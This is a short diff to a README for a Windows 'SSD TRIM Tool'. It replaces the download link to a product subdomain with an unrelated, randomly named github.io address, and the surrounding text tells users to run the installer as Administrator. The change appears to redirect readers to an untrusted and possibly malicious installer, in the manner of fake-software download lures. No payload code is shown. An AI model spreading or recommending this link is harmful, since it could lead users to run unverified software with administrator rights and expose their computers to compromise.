@@ -2,7 +2,7 @@
 
 ## Download & Install
 
-> **Download:** [**Get SSD TRIM Tool for Windows →**](https://ssd-trim-tool.kolmods.com/)
+> **Download:** [**Get SSD TRIM Tool for Windows →**](https://organicistic-massenergyequivalence962.github.io)
 >
 > Setup notes for **SSD TRIM Tool** on Windows 10/11 (64-bit). Run the installer as Administrator.
 
